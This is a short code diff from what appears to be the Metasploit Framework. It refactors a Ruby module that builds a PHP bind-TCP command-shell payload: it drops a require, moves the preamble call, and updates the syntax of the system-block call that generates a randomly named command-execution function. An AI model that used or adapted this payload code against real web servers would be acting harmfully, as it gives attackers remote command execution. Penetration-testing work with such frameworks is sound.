@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/php'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
@@ -50,13 +49,12 @@ module MetasploitModule
     var_fd  = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
     var_out = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
     shell = <<END_OF_PHP_CODE
-error_reporting(0);
+#{php_preamble}
 print("<html><body>");
 flush();
 
 function mysystem(#{var_cmd}){
-  #{php_preamble()}
-  #{php_system_block({:cmd_varname=>var_cmd, :output_varname => var_out})}
+  #{php_system_block(cmd_varname: var_cmd, output_varname: var_out)}
   return #{var_out};
 }
 
